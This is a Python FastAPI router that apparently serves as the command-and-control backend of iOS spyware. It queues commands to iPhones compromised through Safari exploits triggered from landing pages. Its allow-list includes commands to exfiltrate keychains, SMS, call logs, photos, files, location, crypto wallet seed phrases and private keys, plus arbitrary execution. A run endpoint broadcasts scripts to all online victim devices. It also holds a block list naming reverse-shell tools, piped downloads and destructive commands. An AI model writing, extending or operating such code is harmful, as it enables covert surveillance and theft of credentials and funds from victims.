from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from sqlalchemy import desc, or_
from datetime import datetime
from typing import List, Set, Optional
from pydantic import BaseModel

from ..database import get_db, Command, Device, CommandScript, create_audit_log, compute_compatible_level
from ..auth import get_current_user
from ..schemas import CommandResponse, CommandCreate
from .notifications import broadcast_notification_sync
from .settings import require_module_2fa
from ._helpers import apply_agent_filter_command, apply_agent_filter_device, assert_owns_device, _resolve_agent_scope

router = APIRouter(prefix="/api/commands", tags=["commands"], redirect_slashes=False)


ALLOWED_CMD_PREFIXES: Set[str] = {
    "ds_info", "ds_sysinfo", "ds_device", "ds_ua", "ds_os",
    "ds_exfil_keychain", "ds_exfil_wifi", "ds_exfil_contacts",
    "ds_exfil_sms", "ds_exfil_calls", "ds_exfil_photos",
    "ds_exfil_files", "ds_exfil_wallet", "ds_exfil_wallets",
    "ds_keychain", "ds_wifi",
    "ds_contacts", "ds_sms", "ds_calls", "ds_photos", "ds_files", "ds_wallets",
    "ds_file_ls", "ds_file_read", "ds_file_stat", "ds_file_upload", "ds_file_download", "ds_ls", "ds_read",
    "ds_notify", "ds_alert", "ds_vibrate", "ds_command", "ds_history", "ds_list",
    "ds_wallet", "ds_wallet_export", "ds_phrase", "ds_privkey",
    "ds_screenshot", "ds_location", "ds_geo",
    "ds_exec",
    "ui.alert", "ui.notify", "ui.vibrate",
    "ui_alert", "ui_notify", "ui_vibrate",
    "alert", "notify", "vibrate",
    "system.info", "system_info", "sys.info", "device.info", "device_info",
}

FORBIDDEN_KEYWORDS: Set[str] = {
    "rm -rf", "rm -fr", "rm /*", "mkfs", "dd if=", "> /dev/sd",
    "bash -i", "/bin/sh", "nc -e", "nc -lv", "curl |", "wget |",
    "python -c", "perl -e", "php -r", "exec(", "system(", "passthru(",
    "; rm ", "& rm ", "| rm ", "&& rm ", "`rm ", "$(rm ",
    "> /etc/", "> /var/", "chmod 777", "chown root:", "sudo su",
    "../..", "%2e%2e%2f", "powershell", "cmd.exe", "\\\\",
}


MIN_IOS_STR = "iOS 13.0"
MAX_IOS_STR = "iOS 17.2"


SAFARI_ONLY_CMD_PREFIXES = (
    "ds_alert", "ds_notify", "ds_vibrate",
    "ui.alert", "ui.notify", "ui.vibrate",
    "ui_alert", "ui_notify", "ui_vibrate",
    "alert", "notify", "vibrate",
)


def _is_safari_only_cmd(command: Optional[str]) -> bool:
    if not command:
        return False
    cmd = command.strip().lower()
    if not cmd:
        return False
    base = cmd.split(" ", 1)[0].split(":", 1)[0].lower()
    return any(base == p or base.startswith(p + ".") or base.startswith(p + "_") for p in (x.lower() for x in SAFARI_ONLY_CMD_PREFIXES))


def _ensure_device_commandable(db: Session, device: Device, operation: str = "下发命令", command: Optional[str] = None) -> None:
    cl = (device.compatible_level or "").lower()
    if not cl:
        cl = compute_compatible_level(device.os_version, device.browser_name) or ""
        if cl:
            device.compatible_level = cl
            try:
                db.commit()
            except Exception:
                db.rollback()
    version = device.os_version or "未知"
    if cl == "too_low":
        raise HTTPException(status_code=400, detail=f"❌ 设备版本过低（当前 {version}，最低要求 {MIN_IOS_STR}）。{operation}已禁止，请使用 {MIN_IOS_STR} ~ {MAX_IOS_STR} 之间的 Safari 设备。")
    if cl == "too_high":
        raise HTTPException(status_code=400, detail=f"❌ 设备版本过高（当前 {version}，最高支持 {MAX_IOS_STR}）。{operation}已禁止，请使用 {MIN_IOS_STR} ~ {MAX_IOS_STR} 之间的 Safari 设备。")
    if cl in ("incompatible", "unsupported", "no"):
        raise HTTPException(status_code=400, detail=f"❌ 设备不兼容。{operation}已禁止，请使用 {MIN_IOS_STR} ~ {MAX_IOS_STR} 之间的 iPhone / iPad Safari 设备。")
    if _is_safari_only_cmd(command):
        return
    es = (device.exploit_status or "").lower()
    if es == "pending":
        raise HTTPException(status_code=400, detail=f"❌ 设备尚未完成漏洞利用（exploit_status=pending），{operation}会一直 pending 不执行。请先用 Safari 打开渠道落地页触发 exploit，待 devices.exploit_status 变为 success 后再试。（浏览器层UI命令不受此限制）")
    if es == "failed":
        raise HTTPException(status_code=400, detail=f"❌ 设备漏洞利用失败（exploit_status=failed），{operation}无法执行。请检查对应 iOS 版本的 Stage1/2/3 exploit 文件后重试。")
    if es and es != "success":
        raise HTTPException(status_code=400, detail=f"❌ 设备利用状态异常（exploit_status={es}），{operation}无法执行。需等待 exploit_status=success。")


def _validate_command(command: str) -> str:
    cmd = (command or "").strip()
    if not cmd:
        raise HTTPException(status_code=400, detail="命令内容不能为空")
    if len(cmd) > 8192:
        raise HTTPException(status_code=400, detail="命令长度超过 8192 限制")
    cmd_lower = cmd.lower()
    for kw in FORBIDDEN_KEYWORDS:
        if kw in cmd_lower:
            raise HTTPException(status_code=400, detail=f"命令包含危险关键字：{kw!r}，已拒绝执行")
    base = cmd.split(" ", 1)[0].split(":", 1)[0]
    base_lower = base.lower()
    if base_lower not in {p.lower() for p in ALLOWED_CMD_PREFIXES}:
        allowed_show = ", ".join(sorted(ALLOWED_CMD_PREFIXES))
        raise HTTPException(status_code=400, detail=f"命令不在允许白名单内。仅允许以下 ds_* 命名空间：{allowed_show}")
    return cmd


class ScriptCreate(BaseModel):
    name: str
    slug: Optional[str] = ""
    category: Optional[str] = "recon"
    description: str = ""
    content: Optional[str] = None
    command: Optional[str] = None


def _script_to_dict(s: CommandScript):
    return {
        "id": s.id,
        "name": s.name,
        "slug": s.slug or "",
        "category": s.category or "recon",
        "description": s.description or "",
        "command": s.command or "",
        "content": s.command or "",
        "use_count": s.use_count or 0,
        "created_at": s.created_at.isoformat() if s.created_at else None,
        "updated_at": s.updated_at.isoformat() if s.updated_at else None,
    }


def _assert_owns_command(db: Session, user, cmd: Command) -> None:
    if cmd is None:
        return
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return
    dev = db.query(Device).filter(Device.device_uuid == cmd.device_uuid).first()
    if not dev or dev.agent_id is None:
        raise HTTPException(status_code=403, detail="无权限访问该命令")
    if int(dev.agent_id) != int(aid):
        raise HTTPException(status_code=403, detail="无权限访问该命令")


@router.post("", response_model=CommandResponse)
async def create_command(request: Request, payload: CommandCreate, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "commands", otp_code)
    device_uuid = (payload.device_uuid or "").strip()
    if not device_uuid:
        raise HTTPException(status_code=400, detail="device_uuid is required")
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    assert_owns_device(db, current_user, device)
    safe_cmd = _validate_command(payload.command)
    _ensure_device_commandable(db, device, "发送命令", command=safe_cmd)
    new_command = Command(device_uuid=device_uuid, command=safe_cmd, status="pending")
    db.add(new_command)
    db.commit()
    db.refresh(new_command)
    device.last_command_time = datetime.now()
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="command_create", resource_type="command",
                     resource_id=new_command.id, detail=f"Created command '{safe_cmd}' for device {device_uuid}",
                     ip_address=request.client.host if request.client else None)
    broadcast_notification_sync(db, title="新命令已创建", message=f"用户 {username} 向设备 {device_uuid} 发送了命令",
                                category="command", related_device_uuid=device_uuid, related_resource_type="command",
                                related_resource_id=new_command.id)
    return new_command


@router.get("")
async def get_commands(
    device_uuid: str = None, status: str = None,
    skip: int = 0, limit: int = 100,
    page: Optional[int] = None, page_size: Optional[int] = None,
    q: Optional[str] = None, search: Optional[str] = None,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    if page and page_size and skip == 0:
        skip = (page - 1) * page_size
        limit = page_size
    use_search = q or search
    query = db.query(Command).order_by(desc(Command.created_at))
    query = apply_agent_filter_command(query, db, current_user)
    if device_uuid:
        query = query.filter(Command.device_uuid == device_uuid)
    if status:
        query = query.filter(Command.status == status)
    if use_search and use_search.strip():
        kw = f"%{use_search.strip()}%"
        query = query.filter(or_(Command.command.like(kw), Command.output.like(kw)))
    total = query.count()
    rows = query.offset(skip).limit(limit).all()
    items = []
    for c in rows:
        duration_ms = None
        if c.executed_at and c.created_at:
            try:
                duration_ms = int((c.executed_at - c.created_at).total_seconds() * 1000)
            except Exception:
                duration_ms = None
        items.append({
            "id": c.id,
            "device_uuid": c.device_uuid,
            "command": c.command,
            "status": c.status,
            "output": c.output,
            "error": None,
            "created_at": c.created_at.isoformat() if c.created_at else None,
            "executed_at": c.executed_at.isoformat() if c.executed_at else None,
            "duration_ms": duration_ms,
        })
    return {"total": total, "items": items, "skip": skip, "limit": limit}


@router.post("/{command_id}/cancel")
async def cancel_command(
    request: Request, command_id: int, otp_code: str = "",
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    require_module_2fa(db, current_user, "commands", otp_code)
    cmd = db.query(Command).filter(Command.id == int(command_id)).first()
    if not cmd:
        raise HTTPException(status_code=404, detail="Command not found")
    _assert_owns_command(db, current_user, cmd)
    if cmd.status != "pending":
        raise HTTPException(status_code=400, detail=f"Cannot cancel command with status: {cmd.status}")
    cmd.status = "expired"
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="command_cancel", resource_type="command",
                    resource_id=str(command_id), detail=f"Cancelled command id={command_id}",
                    ip_address=request.client.host if request.client else None)
    return {"message": "Cancelled", "id": command_id}


@router.post("/{command_id}/retry")
async def retry_command(
    request: Request, command_id: int, otp_code: str = "",
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    require_module_2fa(db, current_user, "commands", otp_code)
    cmd = db.query(Command).filter(Command.id == int(command_id)).first()
    if not cmd:
        raise HTTPException(status_code=404, detail="Command not found")
    _assert_owns_command(db, current_user, cmd)
    safe_cmd = _validate_command(cmd.command or "")
    dev = db.query(Device).filter(Device.device_uuid == cmd.device_uuid).first()
    if not dev:
        raise HTTPException(status_code=404, detail="Device not found")
    assert_owns_device(db, current_user, dev)
    _ensure_device_commandable(db, dev, "重发命令", command=safe_cmd)
    new_cmd = Command(device_uuid=cmd.device_uuid, command=safe_cmd, status="pending")
    db.add(new_cmd)
    db.commit()
    db.refresh(new_cmd)
    dev.last_command_time = datetime.now()
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="command_retry", resource_type="command",
                    resource_id=str(new_cmd.id), detail=f"Retried command id={command_id} -> new id={new_cmd.id}",
                    ip_address=request.client.host if request.client else None)
    broadcast_notification_sync(db, title="命令已重发", message=f"用户 {username} 重发了命令 id={command_id} -> {new_cmd.id}",
                              category="command", related_device_uuid=cmd.device_uuid,
                              related_resource_type="command",
                              related_resource_id=new_cmd.id)
    return {"message": "Retried", "new_id": new_cmd.id}


@router.get("/scripts")
async def list_scripts(page: int = 1, page_size: int = 20, skip: Optional[int] = None, limit: Optional[int] = None,
                       category: str = "", q: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    query = db.query(CommandScript).order_by(desc(CommandScript.created_at))
    if category:
        query = query.filter(CommandScript.category == category)
    if q:
        like = f"%{q}%"
        query = query.filter(or_(CommandScript.name.ilike(like), CommandScript.slug.ilike(like), CommandScript.description.ilike(like)))
    total = query.count()
    real_skip = skip if skip is not None else max(0, (page - 1) * page_size)
    real_limit = limit if limit is not None else page_size
    items = query.offset(real_skip).limit(real_limit).all()
    return {"total": total, "items": [_script_to_dict(s) for s in items]}


@router.post("/scripts")
async def create_script(request: Request, script: ScriptCreate, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "commands", otp_code)
    raw_cmd = script.command or script.content or ""
    # 脚本允许多行，逐行校验白名单（忽略空行和注释）
    safe_lines = []
    for line in raw_cmd.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            safe_lines.append(line)
            continue
        _validate_command(stripped)
        safe_lines.append(line)
    safe_cmd = "\n".join(safe_lines)

    existing = db.query(CommandScript).filter(CommandScript.name == script.name).first()
    if existing:
        raise HTTPException(400, "脚本名称已存在")
    slug_val = (script.slug or "").strip() or None
    if slug_val:
        dup = db.query(CommandScript).filter(CommandScript.slug == slug_val).first()
        if dup:
            raise HTTPException(400, "Slug 已存在")

    db_script = CommandScript(
        name=script.name, slug=slug_val, category=script.category or "recon",
        description=script.description, command=safe_cmd,
        use_count=0, created_at=datetime.now(), updated_at=datetime.now()
    )
    db.add(db_script)
    db.commit()
    db.refresh(db_script)
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="script_create", resource_type="command_script",
                     resource_id=str(db_script.id), detail=f"Created script: {script.name}",
                     ip_address=request.client.host if request.client else None)
    return _script_to_dict(db_script)


@router.put("/scripts/{script_id}")
@router.patch("/scripts/{script_id}")
async def update_script(request: Request, script_id: int, script: ScriptCreate, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "commands", otp_code)
    db_script = db.query(CommandScript).filter(CommandScript.id == script_id).first()
    if not db_script:
        raise HTTPException(404, "脚本不存在")
    if script.command is not None or script.content is not None:
        raw_cmd = script.command if script.command is not None else (script.content or "")
        safe_lines = []
        for line in raw_cmd.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                safe_lines.append(line)
                continue
            _validate_command(stripped)
            safe_lines.append(line)
        db_script.command = "\n".join(safe_lines)

    if script.name and script.name != db_script.name:
        existing = db.query(CommandScript).filter(CommandScript.name == script.name, CommandScript.id != script_id).first()
        if existing:
            raise HTTPException(400, "脚本名称已存在")
        db_script.name = script.name

    if script.slug is not None and script.slug != (db_script.slug or ""):
        slug_val = (script.slug or "").strip() or None
        if slug_val:
            dup = db.query(CommandScript).filter(CommandScript.slug == slug_val, CommandScript.id != script_id).first()
            if dup:
                raise HTTPException(400, "Slug 已存在")
        db_script.slug = slug_val

    if script.category is not None:
        db_script.category = script.category or "recon"
    if script.description is not None:
        db_script.description = script.description
    db_script.updated_at = datetime.now()
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="script_update", resource_type="command_script",
                     resource_id=str(script_id), detail=f"Updated script: {db_script.name}",
                     ip_address=request.client.host if request.client else None)
    return _script_to_dict(db_script)


@router.delete("/scripts/{script_id}")
async def delete_script(request: Request, script_id: int, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "commands", otp_code)
    db_script = db.query(CommandScript).filter(CommandScript.id == script_id).first()
    if not db_script:
        raise HTTPException(404, "脚本不存在")
    name = db_script.name
    db.delete(db_script)
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="script_delete", resource_type="command_script",
                     resource_id=str(script_id), detail=f"Deleted script: {name}",
                     ip_address=request.client.host if request.client else None)
    return {"message": "Script deleted"}


@router.post("/scripts/{script_id}/run")
async def run_script(request: Request, script_id: int, body: Optional[dict] = None, otp_code: str = "",
                     db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "commands", otp_code)
    db_script = db.query(CommandScript).filter(CommandScript.id == script_id).first()
    if not db_script:
        raise HTTPException(404, "脚本不存在")
    targets = (body or {}).get("targets") or []
    device_uuids = []
    if targets:
        for t in targets:
            dev = db.query(Device).filter(Device.device_uuid == str(t)).first()
            if dev:
                assert_owns_device(db, current_user, dev)
                device_uuids.append(dev.device_uuid)
    else:
        # 发送到全部在线设备（status == online 或 最近心跳 < 10min）
        import datetime as _dt
        cutoff = datetime.now() - _dt.timedelta(minutes=10)
        dev_q = db.query(Device)
        dev_q = apply_agent_filter_device(dev_q, db, current_user)
        for d in dev_q.all():
            if d.status == "online" or (d.last_seen and d.last_seen >= cutoff):
                device_uuids.append(d.device_uuid)

    username = current_user.username if current_user else "anonymous"
    created_count = 0
    accepted_devices = 0
    rejected_devices = []
    command_text = db_script.command or ""
    lines = [l.strip() for l in command_text.splitlines() if l.strip() and not l.strip().startswith("#")]
    for dev_uuid in device_uuids:
        dev = db.query(Device).filter(Device.device_uuid == dev_uuid).first()
        if not dev:
            continue
        try:
            _ensure_device_commandable(db, dev, "运行脚本")
        except HTTPException as e:
            detail = e.detail if isinstance(e.detail, str) else "设备不兼容，脚本下发跳过"
            rejected_devices.append({"device_uuid": dev_uuid, "reason": detail})
            continue
        accepted_devices += 1
        queued_for_device = 0
        for safe_cmd in lines:
            try:
                safe_cmd = _validate_command(safe_cmd)
            except Exception:
                continue
            new_cmd = Command(device_uuid=dev_uuid, command=safe_cmd, status="pending")
            db.add(new_cmd)
            created_count += 1
            queued_for_device += 1
        if queued_for_device > 0:
            dev.last_command_time = datetime.now()
    if accepted_devices > 0:
        db_script.use_count = (db_script.use_count or 0) + 1
    db.commit()
    if accepted_devices == 0 and rejected_devices:
        first_reason = rejected_devices[0].get("reason") or "目标设备均不兼容，脚本未下发"
        raise HTTPException(status_code=400, detail=first_reason)
    create_audit_log(db, username=username, action="script_run", resource_type="command_script",
                     resource_id=str(script_id),
                     detail=(f"Ran script '{db_script.name}' on {accepted_devices} devices ({len(rejected_devices)} rejected), "
                             f"{created_count} commands queued"),
                     ip_address=request.client.host if request.client else None)
    result = {
        "message": "Script dispatched" if accepted_devices else "No compatible targets",
        "devices": accepted_devices,
        "commands_queued": created_count,
    }
    if rejected_devices:
        result["rejected_devices"] = rejected_devices
    return result


@router.get("/{command_id}", response_model=CommandResponse)
async def get_command(command_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    cmd = db.query(Command).filter(Command.id == command_id).first()
    if not cmd:
        raise HTTPException(status_code=404, detail="Command not found")
    _assert_owns_command(db, current_user, cmd)
    return cmd


@router.patch("/{command_id}")
async def update_command(command_id: int, status: str = None, output: str = None, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    cmd = db.query(Command).filter(Command.id == command_id).first()
    if not cmd:
        raise HTTPException(status_code=404, detail="Command not found")
    _assert_owns_command(db, current_user, cmd)
    if status:
        cmd.status = status
    if output is not None:
        cmd.output = output
    if status == "executed" or (status and "done" in status.lower()):
        cmd.executed_at = datetime.now()
    db.commit()
    return {"message": "Command updated"}


class _BatchDeleteCommandsReq(BaseModel):
    ids: Optional[List[int]] = None
    all_filtered: bool = False
    device_uuid: Optional[str] = None
    status: Optional[str] = None
    q: Optional[str] = None


@router.delete("/{command_id}")
async def delete_command(
    request: Request,
    command_id: int,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user = Depends(get_current_user),
):
    require_module_2fa(db, current_user, "commands", otp_code)
    cmd = db.query(Command).filter(Command.id == command_id).first()
    if not cmd:
        raise HTTPException(status_code=404, detail="命令不存在")
    _assert_owns_command(db, current_user, cmd)
    try:
        db.delete(cmd)
        db.commit()
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"删除失败: {e}")
    username = current_user.username if current_user else "anonymous"
    try:
        create_audit_log(db, username=username, action="command_delete", resource_type="command",
                         resource_id=str(command_id),
                         detail=f"Deleted single command [{command_id}]: {str(cmd.command or '')[:80]}",
                         ip_address=request.client.host if request.client else None)
    except Exception:
        pass
    return {"deleted": 1, "message": "已删除 1 条命令"}


@router.post("/batch_delete")
async def batch_delete_commands(
    request: Request,
    body: _BatchDeleteCommandsReq,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user = Depends(get_current_user),
):
    require_module_2fa(db, current_user, "commands", otp_code)
    body = body or _BatchDeleteCommandsReq()
    q = db.query(Command)
    scope, aid = _resolve_agent_scope(db, current_user)
    if scope != "admin" and aid is not None:
        dev_ids = [d.device_uuid for d in db.query(Device.device_uuid).filter(Device.agent_id == int(aid)).all()]
        q = q.filter(Command.device_uuid.in_(dev_ids))
    if body.device_uuid:
        q = q.filter(Command.device_uuid == body.device_uuid.strip())
    if body.status:
        q = q.filter(Command.status == body.status.strip())
    if body.q:
        like = f"%{body.q.strip()}%"
        q = q.filter(or_(Command.command.ilike(like), Command.output.ilike(like)))
    if body.all_filtered:
        pass
    elif body.ids:
        valid_ids = [int(i) for i in (body.ids or []) if i]
        if not valid_ids:
            raise HTTPException(status_code=400, detail="未选择任何命令")
        q = q.filter(Command.id.in_(valid_ids))
    else:
        raise HTTPException(status_code=400, detail="请选择要删除的命令，或开启 all_filtered=true 删除当前筛选下全部")
    try:
        rows = q.all()
        if not rows:
            return {"deleted": 0, "message": "没有可删除的命令"}
        count = len(rows)
        for r in rows:
            try:
                _assert_owns_command(db, current_user, r)
            except HTTPException:
                raise
        deleted_count = 0
        for r in rows:
            try:
                db.delete(r)
                deleted_count += 1
            except Exception:
                continue
        db.commit()
        username = current_user.username if current_user else "anonymous"
        try:
            mode = "筛选全部" if body.all_filtered else f"选中{len(body.ids or [])}条"
            create_audit_log(db, username=username, action="command_batch_delete", resource_type="command",
                             resource_id="batch",
                             detail=f"Batch deleted {deleted_count} commands ({mode}; filter: device_uuid={body.device_uuid or ''}, status={body.status or ''}, q={body.q or ''})",
                             ip_address=request.client.host if request.client else None)
        except Exception:
            pass
        return {"deleted": deleted_count, "message": f"已删除 {deleted_count} 条命令"}
    except HTTPException:
        db.rollback()
        raise
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"批量删除失败: {e}")
